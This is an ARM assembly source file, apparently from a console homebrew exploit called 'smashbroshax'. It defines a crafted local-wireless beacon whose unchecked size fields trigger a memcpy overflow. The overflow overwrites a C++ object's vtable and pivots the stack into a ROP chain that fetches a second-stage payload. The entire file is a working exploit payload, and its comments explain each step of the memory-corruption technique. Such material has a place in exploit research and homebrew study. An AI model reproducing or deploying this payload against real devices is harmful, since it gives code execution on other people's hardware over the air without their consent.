.arm
.section .init
.global _start

#include "smashbroshax.h"

@ Beacon tag data for OUI-type 0x15, big-endian.

_start:
.byte 0x00, 0x1f, 0x32 @ OUI / first 0x1F-bytes of network-struct+0xC.
.byte 0x15 @ OUI type
.byte 0x00, 0x14, 0xC1, 0x10 @ wlancommID, the ID used here is for the demos.
.byte 0x00 @ u8 ID
.byte 0x90, 0x80, 0x00
.byte 0xB3, 0x20, 0x6F, 0x07 @ random u32
.byte 0x01, 04, 0x00, 0x01
.byte 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00
.word 0, 0, 0, 0, 0 @ SHA1 hash
.byte 0xb8 @ Size of the following additional-data.

@ Title-specific additional-data(little-endian):

@ Neither of the below size fields are checked. In memory, the second data-block used with size1 for the memcpy is copied to: adr = buf0adr+size0 + (<value of s8 at additionaldata+0x2> * size1). Therefore, the size and the relative offset for the destination buffer can be controlled.
@ This is used to trigger a memcpy with size 0x1898 with the data @ additionaldata+0x34, which then overwrites a c++ object. See below.

additionaldata_start:
.byte 0xff, 0xff
.byte 0x04 @ s8, index?
.byte 0xff
.byte 0xff, 0xff, 0xff, 0xff
.word 0x4 @ additionaldata+0x8, u32 size0. Normally this is 0x22, however with this haxx value 0x04 is used so that more space is available in the second block.
.word 0x18A0 @ additionaldata+0xc, u32 size1
.word 0xffffffff @ additionaldata+0x10. The data used with size0 for the memcpy begins here. The data used with the memcpy for size1 is located immediately after this block.
.word ADDITIONALDATA_ADR+0x24 @ additionaldata+0x14. Beginning of data which overwrites the c++ object. The ptr here overwrites the vtable ptr, therefore the vtable addr is overwritten with <addr of additionaldata+0x24>. (r0)
.word 0xffffffff @ additionaldata+0x18 / object+0x4. (r1)
.word 0xffffffff @ r2
.word 0xffffffff @ r3
.word 0xffffffff @ r4
.word 0xffffffff @ r5
.word 0xffffffff @ r6
.word 0xffffffff @ r7
.word 0xffffffff @ r8
.word 0xffffffff @ r9
.word 0xffffffff @ sl
.word 0xffffffff @ fp
.word 0xffffffff @ ip
.word (ropstackstart-additionaldata_start) + ADDITIONALDATA_ADR @ sp
.word POP_PC @ lr
.word POP_PC @ pc

.word 0, 0

@ Stack begins here. Once the stack-pivot finishes, sp will be set to here, and "pop {pc}" will be executed.
ropstackstart:
.word POP_R0R4SLIPPC
.word (beaconloadpos-additionaldata_start) + ADDITIONALDATA_ADR @ r0, outbuf
.word 0x400 @ r1, size
.word 0 @ r2, u8 id
.word 0x0014c110 @ r3, wlancommID
.word 0 @ r4
.word 0 @ sl
.word 0 @ ip

.word NWMUDS_RecvBeaconBroadcastData @ Recv a beacon, with outbuf at TMPBUF_ADR.

.word POP_LRPC
.word (beaconloadpos-additionaldata_start) + ADDITIONALDATA_ADR - 4 + (0xc + 0x1c + 0x1bc + 4) @ lr, later moved into sp.

.word MOVSPLR_POPLRPC

beaconloadpos: @ Data from the beacon will be located here once NWMUDS_RecvBeaconBroadcastData finishes. The above ROP sets sp so that ROP continues using the data from smashbros_beacon_rop_payload.s offset 0x4.

.fill ((_start + 0x34+0xb4) - .), 1, 0xffffffff

.word STACKPIVOT_ADR @ additionaldata+0xb4(vtable+0x90). The application calls vtable funcptr +0x90 from the object overwritten above, after the haxx triggers. This results in control of PC(the data located at r0 is also controlled since that's the data overwritten by the above).

